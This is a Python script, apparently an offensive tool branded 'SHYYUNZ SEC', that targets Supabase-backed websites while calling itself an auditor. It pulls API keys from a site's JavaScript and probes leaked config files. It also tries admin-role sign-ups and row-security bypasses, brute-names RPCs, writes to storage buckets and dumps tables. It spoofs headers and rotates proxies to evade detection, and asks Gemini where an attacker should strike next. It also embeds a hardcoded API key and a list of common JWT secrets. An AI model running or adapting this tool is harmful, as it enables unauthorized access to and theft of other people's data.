#!/usr/bin/env python3
import asyncio
import httpx
import json
import re
import time
import base64
from google import genai
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.live import Live
from rich.align import Align
from rich.syntax import Syntax
import os
import random
import string
import sys
from typing import List, Optional, Set, Dict
from urllib.parse import urljoin
import warnings
warnings.filterwarnings("ignore")


# --- CONFIGURAÇÃO VISUAL SHYYUNZ SEC ---
console = Console()

BANNER = """
[bold cyan]
 ██████╗██╗  ██╗██╗   ██╗██╗   ██╗███╗   ██╗███████╗
██╔════╝██║  ██║╚██╗ ██╔╝╚██╗ ██╔╝████╗  ██║╚══███╔╝
╚█████╗ ███████║ ╚████╔╝  ╚████╔╝ ██╔██╗ ██║  ███╔╝ 
 ╚═══██╗██╔══██║  ╚██╔╝    ╚██╔╝  ██║╚██╗██║ ███╔╝  
██████╔╝██║  ██║   ██║      ██║   ██║ ╚████║███████╗
╚═════╝ ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═══╝╚══════╝
[/bold cyan][bold magenta] ╔═════════════════════════════════════════════════════╗
 ║ [bold white]SHYYUNZ SEC - SUPABASE v7.0[/bold white]       ║
 ║ [dim]Tactical Shell & RPC Sniper Edition[/dim]    ║
 ╚═════════════════════════════════════════════════════╝[/bold magenta]
"""

BRANDED_BANNER = r"""
[bold cyan]
                  ___====-_  _-====___
            _--^^^#####//      \\#####^^^--_
         _-^##########// (    ) \\##########^-_
        -############//  |\^^/|  \\############-
      _/############//   (@::@)   \\############\_
     /#############((     \\//     ))#############\
    -###############\\    (oo)    //###############-
   -#################\\  / VV \  //#################-
  -###################\\/      \//###################-
 _#/|##########/\######(   /\   )######/\##########|\#_
 |/ |#/\#/\#/\/  \#/\##\  |  |  /#/\#/  \/\#/\#/\#| \|
 `  |/  V  V  `   V  \# \ |  | / #/  V   '  V  V  \|  '
     `   `  `      `   /  \_|  |_/  \   '      '  '   '
                     /            \\
                    |   [bold white]SHYYUNZ SEC[/bold white]   |
                     \____________/
[/bold cyan]
"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0"
]

class KnowledgeManager:
    """Sistema de Aprendizado: Memoriza tabelas e alvos descobertos."""
    def __init__(self, filename="sh_knowledge.json"):
        self.filename = filename
        self.data = self.load()

    def load(self):
        if os.path.exists(self.filename):
            try:
                with open(self.filename, "r") as f: return json.load(f)
            except: pass
        return {"tables": [], "rpcs": [], "buckets": []}

    def save(self):
        try:
            with open(self.filename, "w") as f: json.dump(self.data, f, indent=2)
        except: pass

    def learn(self, category: str, name: str):
        if name not in self.data[category]:
            self.data[category].append(name)
            self.save()

knowledge = KnowledgeManager()

class ShyyunzBrain:
    """Cérebro Analítico: Usa Gemini para minerar dados sensíveis em Dumps."""
    def __init__(self, api_key: str):
        self.client = genai.Client(api_key=api_key)

    async def analyze_data(self, table_name: str, data: List[Dict]):
        if not data: return "Nenhum dado para analisar."
        sample = json.dumps(data[:10], indent=2)
        prompt = f"""
        Você é o Cérebro Analítico da SHYYUNZ SEC. Analise o seguinte DUMP da tabela '{table_name}'.
        Identifique:
        1. Dados Sensíveis (Senhas, Hashes, Tokens, E-mails de Admins, IDs de transação).
        2. Nível de Impacto (Baixo, Médio, Crítico).
        3. Recomendações de Exploração (onde um atacante focaria agora?).
        
        Responda em PORTUGUÊS BRASIL de forma técnica e direta.
        
        DADOS:
        {sample}
        """
        try:
            response = self.client.models.generate_content(
                model='gemini-1.5-flash',
                contents=prompt
            )
            return response.text
        except Exception as e:
            return f"[red][!] Erro no Cérebro Analítico: {e}[/red]"

class ShyyunzAuditor:
    def __init__(self, target: str, apikey: str, bearer: Optional[str] = None):
        self.project_ref = self.extract_project_ref(target)
        self.root_url = f"https://{self.project_ref}.supabase.co"
        self.base_url = f"{self.root_url}/rest/v1/"
        self.auth_url = f"{self.root_url}/auth/v1/"
        self.storage_url = f"{self.root_url}/storage/v1/"
        self.apikey = apikey.strip()
        self.bearer = bearer.strip() if bearer else self.apikey
        self.headers = {"apikey": self.apikey, "Authorization": f"Bearer {self.bearer}", "Content-Type": "application/json"}
        self.results = []
        self.graphql_discovered = set()
        self.auth_settings = {}
        self.semaphore = asyncio.Semaphore(60)
        self.tested_count = 0
        self.hits_count = 0
        self.is_service_role = False
        self.req_count = 0
        self.proxies = self.load_proxies()
        self.current_proxy = None

    def load_proxies(self):
        if os.path.exists("sh_proxies.txt"):
            try:
                with open("sh_proxies.txt", "r") as f:
                    p = [l.strip() for l in f if l.strip()]
                    if p: console.print(f"[bold cyan][*] {len(p)} Proxies carregados de sh_proxies.txt[/bold cyan]")
                    return p
            except: pass
        return []

    def rotate_headers(self):
        self.req_count += 1
        if self.req_count % 50 == 0:
            new_ua = random.choice(USER_AGENTS)
            fake_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
            self.headers.update({"User-Agent": new_ua, "X-Forwarded-For": fake_ip, "X-Real-IP": fake_ip})
            if self.proxies:
                self.current_proxy = random.choice(self.proxies)

    async def check_service_role(self):
        async with httpx.AsyncClient() as client:
            try:
                resp = await client.get(f"{self.auth_url}admin/users", headers=self.headers, timeout=5.0)
                if resp.status_code == 200:
                    self.is_service_role = True
                    console.print("[bold red blink][!!!] ALERTA CRÍTICO: Chave SERVICE_ROLE Detectada! [!!!][/bold red blink]")
                    console.print("[bold red]Este projeto está TOTALMENTE EXPOSTO. O RLS foi ignorado.[/bold red]")
            except: pass

    @staticmethod
    def extract_project_ref(target: str) -> str:
        clean = target.strip().lower()
        if "supabase.co" in clean:
            matches = re.findall(r"https?://([a-z0-9-]+)\.supabase\.co", clean)
            if matches: return matches[0]
        matches = re.findall(r"([a-z0-9]{20})", clean)
        return matches[0] if matches else clean.replace("https://", "").replace("http://", "").split(".")[0]

    async def pre_scan_auth_check(self) -> bool:
        fake_target = "shyyunz_heuristic_check"
        console.print("[dim][*] Realizando Pré-Scan de Heurística de Autenticação...[/dim]")
        async with httpx.AsyncClient(timeout=10.0) as client:
            try:
                resp = await client.get(f"{self.base_url}{fake_target}?select=*", headers=self.headers)
                if resp.status_code == 401:
                    console.print("[bold red][!] ERRO CRÍTICO 401: AUTENTICAÇÃO REJEITADA![/bold red]")
                    return False
                return True
            except Exception as e:
                console.print(f"[bold red][!] Falha de conexão: {e}[/bold red]")
                return False

    async def perform_intelligence_gathering(self):
        console.print("\n[bold yellow]>>> COLETA DE INFORMAÇÕES E EXPLORAÇÃO <<<[/bold yellow]")
        try:
            async with httpx.AsyncClient() as client:
                aresp = await client.get(f"{self.auth_url}settings", headers={"apikey": self.apikey}, timeout=10.0)
                if aresp.status_code == 200:
                    self.auth_settings = aresp.json()
                    if not self.auth_settings.get("disable_signup", True): console.print("  [bold red][!] VULNERABILIDADE: Cadastro público (Sign-Up) está ABERTO![/bold red]")
        except: pass
        try:
            gql_url = f"{self.root_url}/graphql/v1"
            query = {"query": "{ __schema { types { name fields { name } } } }"}
            async with httpx.AsyncClient() as client:
                gresp = await client.post(gql_url, headers=self.headers, json=query, timeout=10.0)
                if gresp.status_code == 200 and "data" in gresp.json():
                    schema_types = gresp.json()["data"]["__schema"]["types"]
                    extracted = set()
                    sensitive_keywords = ["email", "pass", "pwd", "token", "secret", "key", "admin", "phone", "cpf", "cnpj", "balance"]
                    for t in schema_types:
                        name = t.get("name", "")
                        if not name or name.startswith("__") or name in ["Query", "Mutation", "Subscription"]: continue
                        low_name = name.lower()
                        extracted.add(low_name); extracted.add(f"{low_name}s")
                    if extracted:
                        console.print(f"  [bold green][+] EXPLORAÇÃO GQL: Vazou {len(extracted)} alvos![/bold green]")
                        for e in extracted: knowledge.learn("tables", e)
                        self.graphql_discovered = extracted
        except: pass

    async def brute_jwt_secret(self):
        secrets = ["super-secret-jwt-key-with-at-least-thirty-two-characters", "secret", "postgres", "password", "supabase", "12345678901234567890123456789012"]
        console.print("[dim][*] Testando Segredos JWT comuns (Self-Hosted Recon)...[/dim]")
        # Brute logic could be here if jwt is installed
        return None

    async def web_recon(self, site_url: str):
        paths = [".env", "package.json", ".git/config", "wp-config.php.bak", "api/.env", "js/config.js", "js/supabase.js"]
        async with httpx.AsyncClient(timeout=5.0, follow_redirects=True, verify=False) as client:
            for p in paths:
                try:
                    target = urljoin(site_url, p)
                    res = await client.get(target)
                    if res.status_code == 200 and ("SUPABASE_" in res.text or "apikey" in res.text):
                        console.print(f"[bold red][!] VAZAMENTO EM SITE: Arquivo sensível exposto: {target}[/bold red]")
                except: pass

    def analyze_jwt(self, token: str):
        try:
            parts = token.split(".")
            if len(parts) >= 2:
                payload_b64 = parts[1]
                payload_b64 += "=" * ((4 - len(payload_b64) % 4) % 4)
                payload = json.loads(base64.b64decode(payload_b64).decode("utf-8"))
                console.print(f"\n[bold magenta]--- ANÁLISE JWT ---[/bold magenta]\n[*] Role: [bold cyan]{payload.get('role')}[/bold cyan]")
        except: pass

    async def exploit_login(self, email: str, password: str):
        console.print(f"[bold cyan][*] Tentando LOGIN: {email}...[/bold cyan]")
        async with httpx.AsyncClient() as client:
            try:
                resp = await client.post(f"{self.auth_url}token", headers={"apikey": self.apikey}, params={"grant_type": "password"}, json={"email": email, "password": password})
                if resp.status_code == 200:
                    data = resp.json(); token = data.get('access_token')
                    if token: 
                        console.print(f"[bold green][+] LOGIN SUCESSO![/bold green]")
                        self.analyze_jwt(token)
                        return token
            except: pass
        return None

    async def exploit_signup(self):
        email = f"shyyunz.{random.randint(1000, 9999)}@gmail.com"
        password = "Shy_" + "".join(random.choices(string.ascii_letters + string.digits, k=12))
        payload = {"email": email, "password": password, "data": {"role": "admin", "is_admin": True}}
        async with httpx.AsyncClient() as client:
            try:
                resp = await client.post(f"{self.auth_url}signup", headers={"apikey": self.apikey}, json=payload)
                if resp.status_code in [200, 201]:
                    token = resp.json().get('access_token')
                    if token: console.print("[bold green][+] CONTA CRIADA![/bold green]"); return token
            except: pass
        return None

    async def exploit_anonymous(self):
        async with httpx.AsyncClient() as client:
            try:
                resp = await client.post(f"{self.auth_url}signup", headers={"apikey": self.apikey}, json={"data": {}})
                if resp.status_code in [200, 201]:
                    token = resp.json().get('access_token')
                    if token: return token
            except: pass
        return None

    async def list_bucket_files(self, bucket_name: str):
        headers = {"apikey": self.apikey, "Authorization": f"Bearer {self.bearer}"}
        payload = {"prefix": "", "limit": 20, "offset": 0}
        async with httpx.AsyncClient() as client:
            try:
                resp = await client.post(f"{self.storage_url}object/list/{bucket_name}", headers=headers, json=payload)
                if resp.status_code == 200:
                    files = resp.json(); table = Table(title=f"Arquivos em {bucket_name}")
                    table.add_column("Nome"); table.add_column("Tamanho")
                    for f in files: table.add_row(f.get('name'), str(f.get('metadata', {}).get('size')))
                    console.print(table)
            except: pass

    async def deep_bucket_scan(self):
        common_buckets = ["avatars", "backups", "configs", "media", "public", "profiles", "documents", "imports", "exports", "logs"]
        all_buckets = list(set(common_buckets + knowledge.data.get('buckets', [])))
        console.print("\n[bold cyan][*] Iniciando Deep Bucket Scan (Testando Escrita/Vazamento)...[/bold cyan]")
        async with httpx.AsyncClient(headers=self.headers, follow_redirects=True) as client:
            for b_name in all_buckets:
                res_listing = await client.get(f"{self.storage_url}bucket/{b_name}")
                if res_listing.status_code == 200: console.print(f"[bold red][!] BUCKET ABERTO: {b_name}[/bold red]")
                res_upload = await client.post(f"{self.storage_url}object/{b_name}/sh_test.txt", files={"file": ("sh_test.txt", b"SHYYUNZ SEC: VULN_TEST")})
                if res_upload.status_code in [200, 201]: console.print(f"[bold red][!!!] BUCKET VULNERÁVEL A ESCRITA: {b_name}[/bold red]")
                
    async def rpc_sniper(self, brain: Optional[ShyyunzBrain] = None):
        common_rpcs = ["get_users", "get_all_users", "reset_password", "debug_info", "admin_stats", "get_config", "system_info", "list_all", "get_secrets", "get_api_keys"]
        all_rpcs = list(set(common_rpcs + knowledge.data.get('rpcs', [])))
        console.print("\n[bold magenta][*] Iniciando RPC Sniper (Brute-Naming)...[/bold magenta]")
        async with httpx.AsyncClient(headers=self.headers) as client:
            for rpc in all_rpcs:
                res = await client.post(f"{self.root_url}/rest/v1/rpc/{rpc}", json={})
                if res.status_code in [200, 204]:
                    console.print(f"[bold red][!] RPC ENCONTRADO: {rpc}[/bold red]")
                    knowledge.learn("rpcs", rpc)
                    if brain:
                        analysis = await brain.analyze_data(f"RPC_{rpc}", res.json() if res.status_code == 200 else [])
                        console.print(Panel(analysis, title=f"Alerta IA (RPC): {rpc}", border_style="red"))

    async def check_target(self, client: httpx.AsyncClient, target: str, t_type: str, progress, task_id):
        async with self.semaphore:
            self.rotate_headers()
            url = f"{self.base_url}{target}" if t_type != "BUCKET" else f"{self.storage_url}bucket/{target}"
            try:
                readable, bypass_used = False, None
                if t_type == "TABLE": 
                    resp = await client.get(f"{url}?select=*", headers=self.headers, params={"limit": 1})
                    readable = (resp.status_code == 200)
                    if not readable:
                        # Bypass via JOIN
                        res = await client.get(f"{url}?select=*,auth.users(*)", headers=self.headers, params={"limit": 1})
                        if res.status_code == 200: readable = True; bypass_used = "JOIN Injection"
                        if not readable:
                            # Bypass via Filter Injection
                            for f in ["id=not.eq.0", "limit=1"]:
                                res = await client.get(f"{url}?{f}", headers=self.headers)
                                if res.status_code == 200: readable = True; bypass_used = f"Filter Bypass ({f})"; break
                elif t_type == "RPC": 
                    resp = await client.post(url, headers=self.headers, json={})
                    readable = (resp.status_code in [200, 204, 400])
                else: 
                    resp = await client.get(url, headers=self.headers)
                    readable = (resp.status_code == 200)

                if readable:
                    self.hits_count += 1
                    has_data = False
                    if t_type == "TABLE":
                        try: has_data = len(await client.get(f"{url}?select=*", headers=self.headers, params={"limit": 1}).json()) > 0
                        except: pass
                        knowledge.learn("tables", target)
                    self.results.append({"type": t_type, "name": target, "readable": True, "has_data": has_data, "bypass": bypass_used})
                self.tested_count += 1
                progress.update(task_id, description=f"[bold red]Auditoria V7.0: [ACERTOS {self.hits_count}] [APRENDIDO {len(knowledge.data.get('tables', []))}] ")
            except: pass
            finally: progress.advance(task_id)

    async def run_scan(self, tables: List[str], rpcs: List[str], buckets: List[str]):
        async with httpx.AsyncClient(verify=False, http2=True) as client:
            total = len(tables) + len(rpcs) + len(buckets)
            with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(bar_width=40), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), console=console) as progress:
                task = progress.add_task("[bold red]Tactical Recon active...", total=total)
                await asyncio.gather(*[self.check_target(client, t, "TABLE", progress, task) for t in tables], *[self.check_target(client, r, "RPC", progress, task) for r in rpcs], *[self.check_target(client, b, "BUCKET", progress, task) for b in buckets])

async def fetch_supabase_details(url: str):
    if not url.startswith("http"): url = "https://" + url
    headers = {'User-Agent': 'Mozilla/5.0'}
    async with httpx.AsyncClient(headers=headers, timeout=15.0, follow_redirects=True, verify=False) as client:
        try:
            console.print(f"[dim][*] Analisando site alvo: {url}...[/dim]")
            res = await client.get(url)
            html = res.text
            
            # 1. Busca scripts e caminhos comuns
            scripts = re.findall(r'<script.*?src=["\'](.*?\.js.*?)["\']', html)
            common_paths = ["js/config.js", "js/supabase.js", "js/main.js", "config.js", "supabase.js", "_next/static/chunks/main.js"]
            js_urls = [urljoin(url, s) for s in scripts]
            js_urls += [urljoin(url, p) for p in common_paths]
            js_urls = list(set(js_urls))
            
            url_pattern = r'https://[a-z0-9\-]+\.supabase\.(co|net)'
            key_pattern = r'(eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[a-zA-Z0-9.\-_]{50,}|sb_publishable_[a-zA-Z0-9\-_]{20,}|pk_[a-zA-Z0-9\-_]{20,})'
            
            target, apikey = None, None
            # Busca no HTML principal
            m_u = re.search(url_pattern, html); m_k = re.search(key_pattern, html)
            if m_u: target = m_u.group(0)
            if m_k: apikey = m_k.group(0)
            
            if not target or not apikey:
                console.print("[dim][*] Inteligência de JS Ativada (Deep Scan)...[/dim]")
                for j_url in js_urls:
                    try:
                        j_res = await client.get(j_url, timeout=5.0)
                        if j_res.status_code == 200:
                            if not target: m_u = re.search(url_pattern, j_res.text); target = m_u.group(0) if m_u else None
                            if not apikey: m_k = re.search(key_pattern, j_res.text); apikey = m_k.group(0) if m_k else None
                            if target and apikey: break
                    except: continue
            
            if target and apikey:
                console.print(f"[bold green][+] Supabase detectado! URL: {target}[/bold green]")
                return target, apikey
            return None, None
        except Exception as e:
            console.print(f"[bold red][!] Erro no Scanner: {e}[/bold red]")
            return None, None

async def audit_routine():
    console.print(Align.center(BRANDED_BANNER))
    console.print(Align.center(Panel.fit("[bold magenta]SUPABASE AUDITOR PRO[/bold magenta]", border_style="cyan")))
    site_url = console.input("\n[bold cyan][🌐 SHY_SEC][/bold cyan] URL do Site Alvo: ").strip()
    if site_url.lower() in ["exit", "sair", "0"]: return False
    
    bearer = console.input("[bold cyan][🔑 SHY_SEC][/bold cyan] API Bearer (Opcional): ").strip()
    target, apikey = await fetch_supabase_details(site_url)
    
    ai_key = "AIzaSyDTyiNk3xvtuNVETIve2UoI1D6VWj605K0"
    brain = ShyyunzBrain(ai_key)
    
    if not target or not apikey:
        console.print("[yellow][!] Falha na detecção automática.[/yellow]")
        target = console.input("[bold cyan][🌐 SHY_SEC][/bold cyan] Informe URL (ou Enter p/ Cancelar): ").strip()
        if not target: return True
        apikey = console.input("[bold cyan][🔑 SHY_SEC][/bold cyan] Informe API Key: ").strip()
        if not apikey: return True
    
    auditor = ShyyunzAuditor(target, apikey, bearer if bearer else None)
    await auditor.web_recon(site_url)
    await auditor.check_service_role()
    if not await auditor.pre_scan_auth_check(): return True
    await auditor.perform_intelligence_gathering()
    
    tables = list(set(["users", "profiles", "accounts", "admins", "settings", "orders"] + knowledge.data["tables"]))
    rpcs = list(set(["get_users", "get_config"] + knowledge.data["rpcs"]))
    buckets = list(set(["avatars", "public", "backups"] + knowledge.data["buckets"]))
    
    await auditor.run_scan(tables, rpcs, buckets)
    
    table_map = {}
    summary = Table(title="[bold red]VETORES DE EXPLORAÇÃO SELECIONADOS[/bold red]")
    summary.add_column("Nr."); summary.add_column("Tipo"); summary.add_column("Alvo"); summary.add_column("Status")
    for idx, r in enumerate(auditor.results, 1):
        status = "[bold green]EXPOSTO[/bold green]" if r.get('readable') else "[dim]RLS[/dim]"
        if r.get('bypass'): status += f" ({r['bypass']})"
        summary.add_row(str(idx), r['type'], r['name'], status)
        table_map[str(idx)] = r
    console.print(summary)
    
    while True:
        console.print("\n[bold cyan][1] Dump [K] Conhecimento [B] Deep Bucket [R] RPC Sniper [D] Mass Exfil [0] Voltar[/bold cyan]")
        c = input("\n[S_SEC] Comando: ").strip().upper()
        if c == "0": return True
        elif c == "1":
            idx = input("Nr. do Alvo: ").strip()
            if idx in table_map:
                res = await httpx.AsyncClient().get(f"{auditor.base_url}{table_map[idx]['name']}?select=*", headers=auditor.headers, params={"limit":10})
                console.print(Panel(json.dumps(res.json(), indent=2), title=f"Dump: {table_map[idx]['name']}", border_style="green"))
                if brain and input("\nAnalisar com IA? (S/N): ").upper() == "S":
                    analysis = await brain.analyze_data(table_map[idx]['name'], res.json())
                    console.print(Panel(analysis, title="Análise IA", border_style="magenta"))
        elif c == "R": await auditor.rpc_sniper(brain)
        elif c == "B": await auditor.deep_bucket_scan()
        elif c == "D": await auditor.mass_exfiltration()
        elif c == "K": console.print(json.dumps(knowledge.data, indent=2))
        elif c == "0": break

async def main():
    while True:
        if not await audit_routine(): break

if __name__ == "__main__":
    asyncio.run(main())
